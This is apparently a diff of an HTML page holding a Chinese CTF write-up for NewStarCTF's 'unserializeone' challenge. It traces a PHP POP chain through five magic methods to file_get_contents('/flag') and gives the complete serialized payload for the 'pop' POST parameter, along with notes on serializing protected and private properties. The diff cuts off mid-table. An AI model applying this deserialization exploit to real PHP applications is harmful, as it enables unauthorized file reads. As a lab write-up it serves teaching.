+<div class="language-php highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="x">class Sec{</span>
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="x">    public function __invoke()</span>
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a><span class="x">    {</span>
+</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a><span class="x">        echo file_get_contents('/flag');</span>
+</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a><span class="x">    }</span>
+</span><span id="__span-40-6"><a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong>终点在 <code>Sec::__invoke()</code>。</strong></p>
 <p><strong><code>__invoke</code> 的触发条件：</strong>把一个对象当成函数来调用<strong>，也就是 <code>$obj()</code>。</strong></p>
 <h4 id="step-2"><a class="toclink" href="../../newstarctf-unserializeone/#step-2">Step 2：谁会把对象当函数调用</a></h4>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="x">class Start{</span>
-</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="x">    public function __isset($var)</span>
-</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="x">    {</span>
-</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="x">        ($this-&gt;func)();</span>
-</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a><span class="x">    }</span>
-</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="x">class Start{</span>
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a><span class="x">    public function __isset($var)</span>
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a><span class="x">    {</span>
+</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a><span class="x">        ($this-&gt;func)();</span>
+</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a><span class="x">    }</span>
+</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong><code>($this-&gt;func)()</code> —— 这就是“把 <code>$this-&gt;func</code> 当函数调用”。只要 <code>$this-&gt;func</code> 是一个 <code>Sec</code> 对象，就会走到 <code>Sec::__invoke</code>。</strong></p>
 <p><strong>所以现在要找：</strong><code>__isset</code> 怎么被触发<strong>。</strong></p>
 <p><strong><code>__isset</code> 的触发条件：</strong>对不可访问或不存在的属性调用 <code>isset()</code>（或 <code>empty()</code>）<strong>。</strong></p>
 <h4 id="step-3-isset"><a class="toclink" href="../../newstarctf-unserializeone/#step-3-isset">Step 3：谁会对不存在的属性调用 isset</a></h4>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="x">class eeee{</span>
-</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="x">    public $obj;</span>
-</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a><span class="x">    public function __clone()</span>
-</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a><span class="x">    {</span>
-</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a><span class="x">        if(isset($this-&gt;obj-&gt;cmd)){</span>
-</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a><span class="x">            echo "success";</span>
-</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a><span class="x">        }</span>
-</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a><span class="x">    }</span>
-</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="x">class eeee{</span>
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a><span class="x">    public $obj;</span>
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a><span class="x">    public function __clone()</span>
+</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a><span class="x">    {</span>
+</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a><span class="x">        if(isset($this-&gt;obj-&gt;cmd)){</span>
+</span><span id="__span-42-6"><a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a><span class="x">            echo "success";</span>
+</span><span id="__span-42-7"><a id="__codelineno-42-7" name="__codelineno-42-7" href="#__codelineno-42-7"></a><span class="x">        }</span>
+</span><span id="__span-42-8"><a id="__codelineno-42-8" name="__codelineno-42-8" href="#__codelineno-42-8"></a><span class="x">    }</span>
+</span><span id="__span-42-9"><a id="__codelineno-42-9" name="__codelineno-42-9" href="#__codelineno-42-9"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong><code>isset($this-&gt;obj-&gt;cmd)</code> —— 如果 <code>$this-&gt;obj</code> 是个 <code>Start</code> 对象，而 <code>Start</code> 里没有 <code>cmd</code> 这个属性，</strong>这就是“对不存在的属性调用 isset”<strong>，正好触发 <code>Start::__isset</code>。</strong></p>
 <p><strong>所以 <code>eeee-&gt;obj</code> 要指向一个 <code>Start</code>，而那个 Start 的 <code>func</code> 要指向一个 <code>Sec</code>。</strong></p>
 <p><strong>下一个问题：<code>__clone</code> 怎么触发？</strong></p>
 <h4 id="step-4-clone"><a class="toclink" href="../../newstarctf-unserializeone/#step-4-clone">Step 4：谁在 clone 对象</a></h4>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="x">class Easy{</span>
-</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="x">    public $cla;</span>
-</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="x">    public function __call($fun, $var)</span>
-</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a><span class="x">    {</span>
-</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a><span class="x">        $this-&gt;cla = clone $var[0];</span>
-</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a><span class="x">    }</span>
-</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="x">class Easy{</span>
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="x">    public $cla;</span>
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a><span class="x">    public function __call($fun, $var)</span>
+</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a><span class="x">    {</span>
+</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a><span class="x">        $this-&gt;cla = clone $var[0];</span>
+</span><span id="__span-43-6"><a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a><span class="x">    }</span>
+</span><span id="__span-43-7"><a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong><code>clone $var[0]</code> —— 直接触发被 clone 对象的 <code>__clone</code>。</strong></p>
 <p><strong><code>__call</code> 的触发条件：</strong>调用了对象上不存在的方法<strong>。</strong></p>
 <h4 id="step-5"><a class="toclink" href="../../newstarctf-unserializeone/#step-5">Step 5：谁调用了不存在的方法</a></h4>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="x">class Sec{</span>
-</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="x">    public function __toString()</span>
-</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="x">    {</span>
-</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="x">        $this-&gt;obj-&gt;check($this-&gt;var);</span>
-</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a><span class="x">        return "CTFers";</span>
-</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a><span class="x">    }</span>
-</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="x">class Sec{</span>
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="x">    public function __toString()</span>
+</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a><span class="x">    {</span>
+</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a><span class="x">        $this-&gt;obj-&gt;check($this-&gt;var);</span>
+</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a><span class="x">        return "CTFers";</span>
+</span><span id="__span-44-6"><a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a><span class="x">    }</span>
+</span><span id="__span-44-7"><a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong><code>$this-&gt;obj-&gt;check($this-&gt;var)</code> —— <code>check</code> 这个方法四个类里都没有，所以只要 <code>$this-&gt;obj</code> 是 <code>Easy</code>，就会触发 <code>Easy::__call</code>，</strong>而且第一个参数正好是 <code>$this-&gt;var</code><strong>（也就是我们要 clone 的那个 <code>eeee</code> 对象）。</strong></p>
 <p><strong><code>__toString</code> 的触发条件：</strong>对象被当成字符串使用<strong>。</strong></p>
 <h4 id="step-6"><a class="toclink" href="../../newstarctf-unserializeone/#step-6">Step 6：谁把对象当字符串用了</a></h4>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="x">class Start{</span>
-</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="x">    public function __destruct()</span>
-</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="x">    {</span>
-</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="x">        echo "Welcome to NewStarCTF, ".$this-&gt;name;</span>
-</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="x">    }</span>
-</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="x">class Start{</span>
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a><span class="x">    public function __destruct()</span>
+</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a><span class="x">    {</span>
+</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a><span class="x">        echo "Welcome to NewStarCTF, ".$this-&gt;name;</span>
+</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a><span class="x">    }</span>
+</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong>字符串拼接 <code>"..." . $this-&gt;name</code> —— 如果 <code>$this-&gt;name</code> 是个 <code>Sec</code> 对象，就会触发 <code>Sec::__toString</code>。</strong></p>
 <p><strong>而 <code>__destruct</code> 是</strong>对象被销毁时自动调用<strong>——反序列化出来的对象在脚本结束时都会析构，所以这里是天然的起点。</strong></p>
 <hr />
 <h3 id="_3"><a class="toclink" href="../../newstarctf-unserializeone/#_3">完整链条</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>unserialize 结束、脚本运行完毕
-</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>  → Start::__destruct()            对象销毁自动触发
-</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>    → 字符串拼接 $this-&gt;name
-</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>      → Sec::__toString()          对象被当字符串用
-</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>        → $this-&gt;obj-&gt;check(...)   调用不存在的方法
-</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>          → Easy::__call()         不存在的方法被调用
-</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a>            → clone $var[0]        克隆对象
-</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>              → eeee::__clone()    对象被 clone
-</span><span id="__span-33-9"><a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a>                → isset($this-&gt;obj-&gt;cmd)   不存在的属性
-</span><span id="__span-33-10"><a id="__codelineno-33-10" name="__codelineno-33-10" href="#__codelineno-33-10"></a>                  → Start::__isset()       对不存在的属性 isset
-</span><span id="__span-33-11"><a id="__codelineno-33-11" name="__codelineno-33-11" href="#__codelineno-33-11"></a>                    → ($this-&gt;func)()      对象当函数调用
-</span><span id="__span-33-12"><a id="__codelineno-33-12" name="__codelineno-33-12" href="#__codelineno-33-12"></a>                      → Sec::__invoke()    对象当函数
-</span><span id="__span-33-13"><a id="__codelineno-33-13" name="__codelineno-33-13" href="#__codelineno-33-13"></a>                        → file_get_contents('/flag')
+<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>unserialize 结束、脚本运行完毕
+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>  → Start::__destruct()            对象销毁自动触发
+</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a>    → 字符串拼接 $this-&gt;name
+</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a>      → Sec::__toString()          对象被当字符串用
+</span><span id="__span-46-5"><a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a>        → $this-&gt;obj-&gt;check(...)   调用不存在的方法
+</span><span id="__span-46-6"><a id="__codelineno-46-6" name="__codelineno-46-6" href="#__codelineno-46-6"></a>          → Easy::__call()         不存在的方法被调用
+</span><span id="__span-46-7"><a id="__codelineno-46-7" name="__codelineno-46-7" href="#__codelineno-46-7"></a>            → clone $var[0]        克隆对象
+</span><span id="__span-46-8"><a id="__codelineno-46-8" name="__codelineno-46-8" href="#__codelineno-46-8"></a>              → eeee::__clone()    对象被 clone
+</span><span id="__span-46-9"><a id="__codelineno-46-9" name="__codelineno-46-9" href="#__codelineno-46-9"></a>                → isset($this-&gt;obj-&gt;cmd)   不存在的属性
+</span><span id="__span-46-10"><a id="__codelineno-46-10" name="__codelineno-46-10" href="#__codelineno-46-10"></a>                  → Start::__isset()       对不存在的属性 isset
+</span><span id="__span-46-11"><a id="__codelineno-46-11" name="__codelineno-46-11" href="#__codelineno-46-11"></a>                    → ($this-&gt;func)()      对象当函数调用
+</span><span id="__span-46-12"><a id="__codelineno-46-12" name="__codelineno-46-12" href="#__codelineno-46-12"></a>                      → Sec::__invoke()    对象当函数
+</span><span id="__span-46-13"><a id="__codelineno-46-13" name="__codelineno-46-13" href="#__codelineno-46-13"></a>                        → file_get_contents('/flag')
 </span></code></pre></div>
 <p><strong>五个魔术方法，一层扣一层，最后落在读文件上。</strong></p>
 <hr />
 <h3 id="payload"><a class="toclink" href="../../newstarctf-unserializeone/#payload">Payload</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>O:5:"Start":2:{
-</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>  s:4:"name";O:3:"Sec":2:{
-</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>    s:3:"obj";O:4:"Easy":1:{s:3:"cla";N;}
-</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>    s:3:"var";O:4:"eeee":1:{
-</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a>      s:3:"obj";O:5:"Start":2:{
-</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a>        s:4:"name";N;
-</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a>        s:4:"func";O:3:"Sec":2:{s:3:"obj";N;s:3:"var";N;}
-</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a>      }
-</span><span id="__span-34-9"><a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a>    }
-</span><span id="__span-34-10"><a id="__codelineno-34-10" name="__codelineno-34-10" href="#__codelineno-34-10"></a>  }
-</span><span id="__span-34-11"><a id="__codelineno-34-11" name="__codelineno-34-11" href="#__codelineno-34-11"></a>  s:4:"func";N;
-</span><span id="__span-34-12"><a id="__codelineno-34-12" name="__codelineno-34-12" href="#__codelineno-34-12"></a>}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>O:5:"Start":2:{
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>  s:4:"name";O:3:"Sec":2:{
+</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a>    s:3:"obj";O:4:"Easy":1:{s:3:"cla";N;}
+</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a>    s:3:"var";O:4:"eeee":1:{
+</span><span id="__span-47-5"><a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a>      s:3:"obj";O:5:"Start":2:{
+</span><span id="__span-47-6"><a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a>        s:4:"name";N;
+</span><span id="__span-47-7"><a id="__codelineno-47-7" name="__codelineno-47-7" href="#__codelineno-47-7"></a>        s:4:"func";O:3:"Sec":2:{s:3:"obj";N;s:3:"var";N;}
+</span><span id="__span-47-8"><a id="__codelineno-47-8" name="__codelineno-47-8" href="#__codelineno-47-8"></a>      }
+</span><span id="__span-47-9"><a id="__codelineno-47-9" name="__codelineno-47-9" href="#__codelineno-47-9"></a>    }
+</span><span id="__span-47-10"><a id="__codelineno-47-10" name="__codelineno-47-10" href="#__codelineno-47-10"></a>  }
+</span><span id="__span-47-11"><a id="__codelineno-47-11" name="__codelineno-47-11" href="#__codelineno-47-11"></a>  s:4:"func";N;
+</span><span id="__span-47-12"><a id="__codelineno-47-12" name="__codelineno-47-12" href="#__codelineno-47-12"></a>}
 </span></code></pre></div>
 <p><strong>压成一行：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>O:5:"Start":2:{s:4:"name";O:3:"Sec":2:{s:3:"obj";O:4:"Easy":1:{s:3:"cla";N;}s:3:"var";O:4:"eeee":1:{s:3:"obj";O:5:"Start":2:{s:4:"name";N;s:4:"func";O:3:"Sec":2:{s:3:"obj";N;s:3:"var";N;}}}}s:4:"func";N;}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>O:5:"Start":2:{s:4:"name";O:3:"Sec":2:{s:3:"obj";O:4:"Easy":1:{s:3:"cla";N;}s:3:"var";O:4:"eeee":1:{s:3:"obj";O:5:"Start":2:{s:4:"name";N;s:4:"func";O:3:"Sec":2:{s:3:"obj";N;s:3:"var";N;}}}}s:4:"func";N;}
 </span></code></pre></div>
 <p><strong>POST 参数名 <code>pop</code>，值就是上面那串。</strong></p>
 <h4 id="payload_1"><a class="toclink" href="../../newstarctf-unserializeone/#payload_1">这个 payload 的结构对照</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>外层 Start
-</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>  name → Sec          ← __destruct 拼字符串时触发 __toString
-</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>    obj  → Easy       ← __toString 里调 check()，触发 __call
-</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a>    var  → eeee       ← __call 里 clone 的第一个参数
-</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a>             obj → Start   ← __clone 里 isset($obj-&gt;cmd)，触发 __isset
-</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a>                     func → Sec   ← __isset 里 ($this-&gt;func)()，触发 __invoke
-</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a>  func → N            ← 外层 Start 自己的 func，用不到，给 null 即可
+<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>外层 Start
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>  name → Sec          ← __destruct 拼字符串时触发 __toString
+</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a>    obj  → Easy       ← __toString 里调 check()，触发 __call
+</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a>    var  → eeee       ← __call 里 clone 的第一个参数
+</span><span id="__span-49-5"><a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a>             obj → Start   ← __clone 里 isset($obj-&gt;cmd)，触发 __isset
+</span><span id="__span-49-6"><a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a>                     func → Sec   ← __isset 里 ($this-&gt;func)()，触发 __invoke
+</span><span id="__span-49-7"><a id="__codelineno-49-7" name="__codelineno-49-7" href="#__codelineno-49-7"></a>  func → N            ← 外层 Start 自己的 func，用不到，给 null 即可
 </span></code></pre></div>
 <hr />
 <h3 id="_4"><a class="toclink" href="../../newstarctf-unserializeone/#_4">解题思路总结</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>从能读 flag 的地方倒推：
-</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>  file_get_contents  → Sec::__invoke
-</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>    ← 谁把对象当函数调用？  Start::__isset 的 ($this-&gt;func)()
-</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a>      ← 谁触发 __isset？    eeee::__clone 的 isset($this-&gt;obj-&gt;cmd)
-</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a>        ← 谁触发 __clone？  Easy::__call 的 clone $var[0]
-</span><span id="__span-37-6"><a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a>          ← 谁触发 __call？ Sec::__toString 的 $this-&gt;obj-&gt;check()
-</span><span id="__span-37-7"><a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a>            ← 谁触发 __toString？ Start::__destruct 的字符串拼接
+<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>从能读 flag 的地方倒推：
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>  file_get_contents  → Sec::__invoke
+</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>    ← 谁把对象当函数调用？  Start::__isset 的 ($this-&gt;func)()
+</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a>      ← 谁触发 __isset？    eeee::__clone 的 isset($this-&gt;obj-&gt;cmd)
+</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a>        ← 谁触发 __clone？  Easy::__call 的 clone $var[0]
+</span><span id="__span-50-6"><a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a>          ← 谁触发 __call？ Sec::__toString 的 $this-&gt;obj-&gt;check()
+</span><span id="__span-50-7"><a id="__codelineno-50-7" name="__codelineno-50-7" href="#__codelineno-50-7"></a>            ← 谁触发 __toString？ Start::__destruct 的字符串拼接
 </span></code></pre></div>
 <p><strong>每一步都在问同一个问题：</strong>要走到下一步，得先满足什么条件？<strong>——然后去别的类里找满足这个条件的地方。</strong></p>
 <h4 id="_5"><a class="toclink" href="../../newstarctf-unserializeone/#_5">漏洞原理</a></h4>
@@ -4166,9 +4166,9 @@
 <summary>属性可见性：protected / private 的写法不一样</summary>
 <p><strong>本题源码里四个类的属性在页面截图上都是 <code>public</code>，所以直接写属性名就行。</strong></p>
 <p><strong>但如果遇到 <code>protected</code> 或 <code>private</code>，序列化串里的名字要带前缀，而且</strong>长度要把前缀算进去<strong>：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>public     s:4:"name";          直接写名字
-</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>protected  s:7:"\0*\0name";     前面是 \0 + * + \0，共 3 字节前缀
-</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>private    s:10:"\0Sec\0name";  前面是 \0 + 类名 + \0
+<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>public     s:4:"name";          直接写名字
+</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>protected  s:7:"\0*\0name";     前面是 \0 + * + \0，共 3 字节前缀
